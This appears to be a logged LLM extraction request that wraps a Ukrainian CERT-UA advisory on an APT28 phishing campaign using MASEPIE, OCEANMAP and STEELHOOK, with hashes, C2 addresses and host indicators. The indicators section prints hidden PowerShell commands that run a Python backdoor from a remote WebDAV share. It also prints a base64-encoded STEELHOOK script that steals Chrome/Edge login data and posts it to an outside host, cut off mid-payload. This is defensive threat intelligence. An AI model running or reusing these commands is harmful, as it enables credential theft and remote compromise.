@@ -1,0 +1,422 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Протягом 15-25 грудня 2023 року виявлено декілька випадків розповсюдження серед державних організацій електронних листів з посиланнями на "документи", відвідування яких призводило до ураження ЕОМ шкідливими програмами.</p><p>В процесі дослідження інцидентів з'ясовано, що згадані посилання забезпечують перенаправлення жертви на вебресурс, на якому за допомогою JavaScript та особливостей прикладного протоколу "search" ("ms-search") <a href="https://www.trellix.com/about/newsroom/stories/research/beyond-file-search-a-novel-method/" rel="noopener noreferrer" target="_blank">[1]</a> здійснюється завантаження файлу-ярлика, відкриття якого призводить до запуску PowerShell-команди, призначеної для завантаження з віддаленого (SMB) ресурсу та запуску (відкриття) документу-приманки, а також інтерпретатора мови програмування Python і файлу Client.py, що класифіковано як MASEPIE.</p><p>З використанням MASEPIE на комп'ютер довантажується та запускається OPENSSH (для побудови тонелю), PowerShell-сценарцій STEELHOOK (викрадення даних Інтернет-браузерів Chrome/Edge), а також бекдор OCEANMAP. Крім того, протягом години з моменту первинної компрометації на комп'ютері створюються IMPACKET, SMBEXEC та ін., за допомогою яких здійснюється розвідка мережі та спроби подальшого горизонтального переміщення.</p><p>За сукупністю тактик, технік, процедур та інструментарію активність асоційовано з діяльністю угрупування APT28. При цьому, очевидно, що зловмисний задум також передбачає вжиття заходів з розвитку кібератаки на всю інформаційно-комунікаційну систему організації. Таким чином, компрометація будь-якої ЕОМ може створити загрозу для всієї мережі.</p><p>Зауважимо, що випадки здійснення аналогічних атак зафіксовано також у відношенні польських організацій.</p><p><em>Довідково:</em></p><ul><li><strong>OCEANMAP</strong> - шкідлива програма, розроблена з використанням мови програмування C#. Основний функціонал полягає у виконанні команд за допомогою cmd.exe. Як канал управління використовується протокол IMAP. Команди, в base64-кодованому вигляді, містяться у чернетках повідомлень ("Drafts") відповідних каталогів електронних поштових скриньок; кожна з чернеток містить назву ЕОМ, ім'я користувача та версію ОС. Результати виконання команд зберігаються в каталозі вхідних повідомлень ("INBOX"). Реалізовано механізм оновлення конфігурації (інтервал перевірки команд, адреси та автентифікаційні дані облікових записів пошти), що передбачає патчинг виконуваного файлу бекдору та перезапуск процесу. Персистентність забезпечено шляхом створення .URL-файлу 'VMSearch.url' в каталозі автозапуску.</li><li><strong>MASEPIE</strong> - шкідлива програма, розроблена з використанням мови програмування Python. Основний функціонал полягає у завантаженні/вивантаженні файлів та виконанні команд. Як канал управління використовується протокол TCP. Дані шифруються за допомогою алгоритму AES-128-CBC; ключ, що є послідовністю 16 довільних байт, генерується на початку встановлення з'єднання. Персистентність бекдору забезпечується створенням ключа 'SysUpdate' в гілці "Run" реєстру ОС, а також, за допомогою LNK-файлу 'SystemUpdate.lnk' в каталозі автозапуску.</li><li><strong>STEELHOOK</strong> - PowerShell-сценарій, що забезпечує викрадення даних Інтернет-браузерів ("Login Data", "Local State") та майстер-ключа DPAPI шляхом їх відправки на сервер управління за допомогою HTTP POST-запиту в base64-кодованому вигляді.</li></ul><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">9724cecaa8ca38041ee9f2a42cc5a297&nbsp; &nbsp; 4fa8caea8002cd2247c2d5fd15d4e76762a0f0cdb7a3c9de5b7f4d6b2ab34ec6&nbsp; &nbsp; 2.txt
+5f126b2279648d849e622e4be910b96c&nbsp; &nbsp; 6bae493b244a94fd3b268ff0feb1cd1fbc7860ecf71b1053bf43eea88e578be9&nbsp; &nbsp; 2.ps1 (STEELHOOK)
+47f4b4d8f95a7e842691120c66309d5b&nbsp; &nbsp; 18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6&nbsp; &nbsp; Client.py (MASEPIE)
+8d1b91e8fb68e227f1933cfab99218a4&nbsp; &nbsp; 6d44532b1157ddc2e1f41df178ea9cbc896c19f79e78b3014073af2d8d9504fe&nbsp; &nbsp; VMSearch.sfx.exe
+6fdd416a768d04a1af1f28ecaa29191b&nbsp; &nbsp; fb2c0355b5c3adc9636551b3fd9a861f4b253a212507df0e346287110233dc23&nbsp; &nbsp; VMSearch.exe (OCEANMAP)
+5db75e816b4cef5cc457f0c9e3fc4100&nbsp; &nbsp; 24fd571600dcc00bf2bb8577c7e4fd67275f7d19d852b909395bebcbb1274e04&nbsp; &nbsp; VMSearch.exe (OCEANMAP)
+6128d9bf34978d2dc7c0a2d463d1bcdd&nbsp; &nbsp; 19d0c55ac466e4188c4370e204808ca0bc02bba480ec641da8190cb8aee92bdc&nbsp; &nbsp; KFP.311.152.2023.pdf .lnk
+825a12e2377dd694bbb667f862d60c43&nbsp; &nbsp; 593583b312bf48b7748f4372e6f4a560fd38e969399cf2a96798e2594a517bf4&nbsp; &nbsp; KFP.311.152.2023.pdf.lnk
+acd9fc44001da67f1a3592850ec09cb7&nbsp; &nbsp; c22868930c02f2d6962167198fde0d3cda78ac18af506b57f1ca25ca5c39c50d&nbsp; &nbsp; Стратегії України.pdf .lnk
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">\\194[.]126.178.8@80\webdav\Docs\231130 № 581.pdf&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.lnk
+\\194[.]126.178.8@80\webdav\Docs\231130 № 581.pdf
+\\194[.]126.178.8@80\webdav\Python39\Client[.]py
+\\194[.]126.178.8@80\webdav\Python39\python[.]exe
+173[.]239.196.66 (X-Originating-IP)
+(tcp)://88[.]209.251.6:80
+194[.]126.178.8
+88[.]209.251.6
+74[.]124.219.71 (OCEANMAP C2)
+czyrqdnvpujmmjkfhhvs4knf1av02demj.oast[.]fun
+czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast[.]fun
+czyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast[.]fun
+czyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast[.]fun
+hXXp://194[.]126.178.8/webdav/wody[.]pdf
+hXXp://194[.]126.178.8/webdav/wody[.]zip
+hXXp://194.126.178.8/webdav/StrategyUa.pdf
+hXXp://194[.]126.178.8/webdav/231130N581[.]pdf
+hXXp://czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast[.]fun
+hXXp://czyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast[.]fun
+hXXp://czyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast[.]fun
+hXXp://czyrqdnvpujmmjkfhhvs4knf1av02demj.oast[.]fun
+hXXps://nas-files.firstcloudit[.]com/
+hXXps://ua-calendar.firstcloudit[.]com/
+hXXps://e-nas.firstcloudit[.]com/
+jrb@bahouholdings.com (OCEANMAP C2)
+nas-files.firstcloudit[.]com
+e-nas.firstcloudit[.]com
+ua-calendar.firstcloudit[.]com
+qasim.m@facadesolutionsuae.com (OCEANMAP C2)
+webmail.facadesolutionsuae[.]com (OCEANMAP C2)
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%PROGRAMDATA%\2.txt
+%PROGRAMDATA%\python.zip
+%PROGRAMDATA%\python\python-3.10.0-embed-amd64\Client.py
+%USERPROFILE%\.ssh\known_hosts
+%LOCALAPPDATA%\11.zip
+%LOCALAPPDATA%\Temp\RarSFX0\VMSearch.exe
+%LOCALAPPDATA%\Temp\RarSFX1\VMSearch.exe
+%LOCALAPPDATA%\Temp\VMSearch.sfx.exe
+%LOCALAPPDATA%\i.lnk
+%LOCALAPPDATA%\key
+%LOCALAPPDATA%\python.zip
+%LOCALAPPDATA%\python\python-3.10.0-embed-amd64\Client.py
+%LOCALAPPDATA%\python\python-3.10.0-embed-amd64\python.exe
+%LOCALAPPDATA%\qz.zip
+%LOCALAPPDATA%\s.lnk
+%LOCALAPPDATA%\s.zip
+%LOCALAPPDATA%\s2.zip
+%LOCALAPPDATA%\s3.zip
+%LOCALAPPDATA%\sys.zip
+%LOCALAPPDATA%\t.lnk
+%LOCALAPPDATA%\temp1.txt
+%LOCALAPPDATA%\temp2.txt
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.lnk
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\VMSearch.url
+C:\WINDOWS\system32\cmd.exe /c "powershell.exe -c "$a=Get-Content "%LOCALAPPDATA%\2.txt";powershell.exe -windowstyle hidden -encodedCommand $a""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "%PROGRAMDATA%\python\python-3.10.0-embed-amd64\python.exe %PROGRAMDATA%\python\python-3.10.0-embed-amd64\Client.py"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/231130N581.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/wody.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop&nbsp; -c "[system.Diagnostics.Process]::Start('msedge','http://194.126.178.8/webdav/StrategyUa.pdf'); \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c %LOCALAPPDATA%\python\python-3.10.0-embed-amd64\python.exe %LOCALAPPDATA%\python\python-3.10.0-embed-amd64\Client.py
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hid -nop -c \\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -encodedCommand "QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwA7ACAAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5ADsAIAAkAGgAbwBvAGsAPQAiAGgAdAB0AHAAOgAvAC8AYwB6AHkAcgBxAGQAbgB2AHAAdQBqAG0AbQBqAGsAZgBoAGgAdgBzAGMAbAB4ADAANQBzAGYAaQAyADMAYgBmAHIALgBvAGEAcwB0AC4AZgB1AG4AIgA7ACAAJABkAGEAdABhAFAAYQB0AGgAPQAiACQAKAAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAKQBcAFwARwBvAG8AZwBsAGUAXABcAEMAaAByAG8AbQBlAFwAXABVAHMAZQByACAARABhAHQAYQBcAFwARABlAGYAYQB1AGwAdABcAFwATABvAGcAaQBuACAARABhAHQAYQAiADsAIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUAUABhAHQAaAAgAD0AIAAiACQAKAAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAKQBcAFwARwBvAG8AZwBsAGUAXABcAEMAaAByAG8AbQBlAFwAXABVAHMAZQByACAARABhAHQAYQBcAFwATABvAGMAYQBsACAAUwB0AGEAdABlACIAOwAgACQAbABvAGMAYQBsAFMAdABhAHQAZQBKAHMAbwBuAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUAUABhAHQAaAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgA7ACQAZQBuAGMAXwBrAGUAeQAgAD0AIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUASgBzAG8AbgAuAG8AcwBfAGMAcgB5AHAAdAAuAGUAbgBjAHIAeQBwAHQAZQBkAF8AawBlAHkAOwAgACQAbQBhAHMAdABlAHIAXwBrAGUAeQBfAGUAbgBjAG8AZABlAGQAIAA9ACAAWwBiAHkAdABlAFsAXQBdAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABlAG4AYwBfAGsAZQB5ACkAOwAgACQAawBlAHkAIAA9ACAAWwBzAHkAcwB0AGUAbQAuAHMAZQBjAHUAcgBpAHQAeQAuAGMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AcAByAG8AdABlAGMAdABlAGQAZABhAHQAYQBdADoAOgBVAG4AcAByAG8AdABlAGMAdAAoACQAbQBhAHMAdABlAHIAXwBrAGUAeQBfAGUAbgBjAG8AZABlAGQAWwA1AC4ALgAkAG0AYQBzAHQAZQByAF8AawBlAHkAXwBlAG4AYwBvAGQAZQBkAC4AbABlAG4AZwB0AGgAXQAsACAAJABuAHUAbABsACwAIABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBEAGEAdABhAFAAcgBvAHQAZQBjAHQAaQBvAG4AUwBjAG8AcABlAF0AOgA6AEMAdQByAHIAZQBuAHQAVQBzAGUAcgApADsAIAAkAGwAbwBnAGkAbgBEAGEAdABhAEMAbwBuAHQAZQBuAHQAIAA9ACAAWwBjAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBwAGEAdABoACAAJABkAGEAdABhAFAAYQB0AGgAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGIAeQB0AGUAKQApADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AGsAZQB5AD0AKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGsAZQB5ACkAKQA7AGQAYQB0AGEAPQAkAGwAbwBnAGkAbgBEAGEAdABhAEMAbwBuAHQAZQBuAHQAIAB9ADsAIABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABoAG8AbwBrACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEIAbwBkAHkAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAAtAHUAcwBlAGIAOwAgACQAZABhAHQAYQBQAGEAdABoAD0AIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABcAE0AaQBjAHIAbwBzAG8AZgB0AFwAXABFAGQAZwBlAFwAXABVAHMAZQByACAARABhAHQAYQBcAFwARABlAGYAYQB1AGwAdABcAFwATABvAGcAaQBuACAARABhAHQAYQAiADsAIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUAUABhAHQAaAAgAD0AIAAiACQAKAAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAKQBcAFwATQBpAGMAcgBvAHMAbwBmAHQAXABcAEUAZABnAGUAXABcAFUAcwBlAHIAIABEAGEAdABhAFwAXABMAG8AYwBhAGwAIABTAHQAYQB0AGUAIgA7ACAAJABsAG8AYwBhAGwAUwB0AGEAdABlAEoAcwBvAG4APQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACQAbABvAGMAYQBsAFMAdABhAHQAZQBQAGEAdABoACAALQBSAGEAdwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuADsAJABlAG4AYwBfAGsAZQB5ACAAPQAgACQAbABvAGMAYQBsAFMAdABhAHQAZQBKAHMAbwBuAC4AbwBzAF8AYwByAHkAcAB0AC4AZQBuAGMAcgB5AHAAdABlAGQAXwBrAGUAeQA7ACAAJABtAGEAcwB0AGUAcgBfAGsAZQB5AF8AZQBuAGMAbwBkAGUAZAAgAD0AIABbAGIAeQB0AGUAWwBdAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGUAbgBjAF8AawBlAHkAKQA7ACAAJABrAGUAeQAgAD0AIABbAHMAeQBzAHQAZQBtAC4AcwBlAGMAdQByAGkAdAB5AC4AYwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBwAHIAbwB0AGUAYwB0AGUAZABkAGEAdABhAF0AOgA6AFUAbgBwAHIAbwB0AGUAYwB0ACgAJABtAGEAcwB0AGUAcgBfAGsAZQB5AF8AZQBuAGMAbwBkAGUAZABbADUALgAuACQAbQBhAHMAdABlAHIAXwBrAGUAeQBfAGUAbgBjAG8AZABlAGQALgBsAGUAbgBnAHQAaABdACwAIAAkAG4AdQBsAGwALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEQAYQB0AGEAUAByAG8AdABlAGMAdABpAG8AbgBTAGMAbwBwAGUAXQA6ADoAQwB1AHIAcgBlAG4AdABVAHMAZQByACkAOwAgACQAbABvAGcAaQBuAEQAYQB0AGEAQwBvAG4AdABlAG4AdAAgAD0AIABbAGMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAHAAYQB0AGgAIAAkAGQAYQB0AGEAUABhAHQAaAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYgB5AHQAZQApACkAOwAgACQAcABvAHMAdABQAGEAcgBhAG0AcwAgAD0AIABAAHsAawBlAHkAPQAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAawBlAHkAKQApADsAZABhAHQAYQA9ACQAbABvAGcAaQBuAEQAYQB0AGEAQwBvAG4AdABlAG4AdAAgAH0AOwAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAGgAbwBvAGsAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwAgAC0AdQBzAGUAYgA7AA=="
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -encodedCommand QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwA7ACAAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5ADsAIAAkAGgAbwBvAGsAPQAiAGgAdAB0AHAAOgAvAC8AYwB6AHkAcgBxAGQAbgB2AHAAdQBqAG0AbQBqAGsAZgBoAGgAdgBzAGMAbAB4ADAANQBzAGYAaQAyADMAYgBmAHIALgBvAGEAcwB0AC4AZgB1AG4AIgA7ACAAJABkAGEAdABhAFAAYQB0AGgAPQAiACQAKAAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAKQBcAFwARwBvAG8AZwBsAGUAXABcAEMAaAByAG8AbQBlAFwAXABVAHMAZQByACAARABhAHQAYQBcAFwARABlAGYAYQB1AGwAdABcAFwATABvAGcAaQBuACAARABhAHQAYQAiADsAIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUAUABhAHQAaAAgAD0AIAAiACQAKAAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAKQBcAFwARwBvAG8AZwBsAGUAXABcAEMAaAByAG8AbQBlAFwAXABVAHMAZQByACAARABhAHQAYQBcAFwATABvAGMAYQBsACAAUwB0AGEAdABlACIAOwAgACQAbABvAGMAYQBsAFMAdABhAHQAZQBKAHMAbwBuAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUAUABhAHQAaAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABGAHIAbwBtAC0ASgBzAG8AbgA7ACQAZQBuAGMAXwBrAGUAeQAgAD0AIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUASgBzAG8AbgAuAG8AcwBfAGMAcgB5AHAAdAAuAGUAbgBjAHIAeQBwAHQAZQBkAF8AawBlAHkAOwAgACQAbQBhAHMAdABlAHIAXwBrAGUAeQBfAGUAbgBjAG8AZABlAGQAIAA9ACAAWwBiAHkAdABlAFsAXQBdAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABlAG4AYwBfAGsAZQB5ACkAOwAgACQAawBlAHkAIAA9ACAAWwBzAHkAcwB0AGUAbQAuAHMAZQBjAHUAcgBpAHQAeQAuAGMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AcAByAG8AdABlAGMAdABlAGQAZABhAHQAYQBdADoAOgBVAG4AcAByAG8AdABlAGMAdAAoACQAbQBhAHMAdABlAHIAXwBrAGUAeQBfAGUAbgBjAG8AZABlAGQAWwA1AC4ALgAkAG0AYQBzAHQAZQByAF8AawBlAHkAXwBlAG4AYwBvAGQAZQBkAC4AbABlAG4AZwB0AGgAXQAsACAAJABuAHUAbABsACwAIABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBEAGEAdABhAFAAcgBvAHQAZQBjAHQAaQBvAG4AUwBjAG8AcABlAF0AOgA6AEMAdQByAHIAZQBuAHQAVQBzAGUAcgApADsAIAAkAGwAbwBnAGkAbgBEAGEAdABhAEMAbwBuAHQAZQBuAHQAIAA9ACAAWwBjAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBwAGEAdABoACAAJABkAGEAdABhAFAAYQB0AGgAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGIAeQB0AGUAKQApADsAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAA9ACAAQAB7AGsAZQB5AD0AKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGsAZQB5ACkAKQA7AGQAYQB0AGEAPQAkAGwAbwBnAGkAbgBEAGEAdABhAEMAbwBuAHQAZQBuAHQAIAB9ADsAIABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABoAG8AbwBrACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEIAbwBkAHkAIAAkAHAAbwBzAHQAUABhAHIAYQBtAHMAIAAtAHUAcwBlAGIAOwAgACQAZABhAHQAYQBQAGEAdABoAD0AIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABcAE0AaQBjAHIAbwBzAG8AZgB0AFwAXABFAGQAZwBlAFwAXABVAHMAZQByACAARABhAHQAYQBcAFwARABlAGYAYQB1AGwAdABcAFwATABvAGcAaQBuACAARABhAHQAYQAiADsAIAAkAGwAbwBjAGEAbABTAHQAYQB0AGUAUABhAHQAaAAgAD0AIAAiACQAKAAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAKQBcAFwATQBpAGMAcgBvAHMAbwBmAHQAXABcAEUAZABnAGUAXABcAFUAcwBlAHIAIABEAGEAdABhAFwAXABMAG8AYwBhAGwAIABTAHQAYQB0AGUAIgA7ACAAJABsAG8AYwBhAGwAUwB0AGEAdABlAEoAcwBvAG4APQAgAEcAZQB0AC0AQwBvAG4AdABlAG4AdAAgACQAbABvAGMAYQBsAFMAdABhAHQAZQBQAGEAdABoACAALQBSAGEAdwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuADsAJABlAG4AYwBfAGsAZQB5ACAAPQAgACQAbABvAGMAYQBsAFMAdABhAHQAZQBKAHMAbwBuAC4AbwBzAF8AYwByAHkAcAB0AC4AZQBuAGMAcgB5AHAAdABlAGQAXwBrAGUAeQA7ACAAJABtAGEAcwB0AGUAcgBfAGsAZQB5AF8AZQBuAGMAbwBkAGUAZAAgAD0AIABbAGIAeQB0AGUAWwBdAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGUAbgBjAF8AawBlAHkAKQA7ACAAJABrAGUAeQAgAD0AIABbAHMAeQBzAHQAZQBtAC4AcwBlAGMAdQByAGkAdAB5AC4AYwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBwAHIAbwB0AGUAYwB0AGUAZABkAGEAdABhAF0AOgA6AFUAbgBwAHIAbwB0AGUAYwB0ACgAJABtAGEAcwB0AGUAcgBfAGsAZQB5AF8AZQBuAGMAbwBkAGUAZABbADUALgAuACQAbQBhAHMAdABlAHIAXwBrAGUAeQBfAGUAbgBjAG8AZABlAGQALgBsAGUAbgBnAHQAaABdACwAIAAkAG4AdQBsAGwALAAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAEQAYQB0AGEAUAByAG8AdABlAGMAdABpAG8AbgBTAGMAbwBwAGUAXQA6ADoAQwB1AHIAcgBlAG4AdABVAHMAZQByACkAOwAgACQAbABvAGcAaQBuAEQAYQB0AGEAQwBvAG4AdABlAG4AdAAgAD0AIABbAGMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAHAAYQB0AGgAIAAkAGQAYQB0AGEAUABhAHQAaAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAYgB5AHQAZQApACkAOwAgACQAcABvAHMAdABQAGEAcgBhAG0AcwAgAD0AIABAAHsAawBlAHkAPQAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAawBlAHkAKQApADsAZABhAHQAYQA9ACQAbABvAGcAaQBuAEQAYQB0AGEAQwBvAG4AdABlAG4AdAAgAH0AOwAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAG